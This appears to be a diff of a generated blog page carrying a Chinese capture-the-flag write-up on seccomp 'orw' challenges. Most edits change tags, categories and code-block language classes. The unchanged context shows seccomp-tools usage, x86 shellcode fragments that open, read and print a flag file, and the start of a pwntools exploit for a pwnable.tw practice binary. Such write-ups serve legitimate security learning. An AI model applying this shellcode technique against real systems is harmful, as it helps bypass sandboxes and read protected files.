@@ -364,12 +364,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/orw/">
+                                <span class="chip bg-color">orw</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/PWN/" class="post-category">
+                                PWN
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -411,14 +424,14 @@
 <h2 id="沙箱函数"><a href="#沙箱函数" class="headerlink" title="沙箱函数"></a>沙箱函数</h2><p>原始的沙箱都是使用prctl()函数进行,所以能看见这个函数的时候一般都有开了沙箱</p>
 <p><code>**prctl** ( int **option**,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )</code></p>
 <h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>可以通过<code>seccomp-tools</code>来判断是否添加沙箱，以及查看沙箱的规则</p>
-<h3 id="seccomp-tools的安装"><a href="#seccomp-tools的安装" class="headerlink" title="seccomp-tools的安装"></a>seccomp-tools的安装</h3><pre class="line-numbers language-none"><code class="language-none">$ sudo apt install gcc ruby-dev
+<h3 id="seccomp-tools的安装"><a href="#seccomp-tools的安装" class="headerlink" title="seccomp-tools的安装"></a>seccomp-tools的安装</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ sudo apt install gcc ruby-dev
 $ gem install seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h2 id="seccomp-tools的使用"><a href="#seccomp-tools的使用" class="headerlink" title="seccomp-tools的使用"></a>seccomp-tools的使用</h2><p><code>seccomp-tools dump ./pwn</code></p>
 <h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h2><p>一般来说，orw这种类型的题都会有一个mmap函数来改写一个地址的读写权限，我们需要利用这块地址来构造ROP链。</p>
 <p><code>void *mmap (void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
 <h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>没有开启NX保护的时候，可以让程序执行自己输入的指令直接调用orw三个系统调用(x86下的shellcode,x64需要修改一下寄存器)</p>
-<pre class="line-numbers language-none"><code class="language-none">#fd = open('/home/orw/flag',0) 
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#fd = open('/home/orw/flag',0) 
 s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''
 
 #read(fd,0x804a094,0x20) 
@@ -435,7 +448,7 @@ s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''<span aria-hidden="true"
 <p><img src="/2024/02/21/orw/pwnable.tw.orw.3.png"></p>
 <p>先是orw_seccomp限定了orw，然后hint用shellcode过去</p>
 <p>那么写exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 
 context(os="linux", arch="i386", log_level="debug")
 
@@ -536,7 +549,11 @@ p.interactive()
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/orw/">
+                                    <span class="chip bg-color">orw</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -741,13 +758,25 @@ gitment.render('gitment-content');
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            J1ton9
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/orw/">
+                        <span class="chip bg-color">orw</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -781,13 +810,21 @@ gitment.render('gitment-content');
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Markdown/" class="post-category">
-                                    Markdown
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
                                 </a>
                             
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
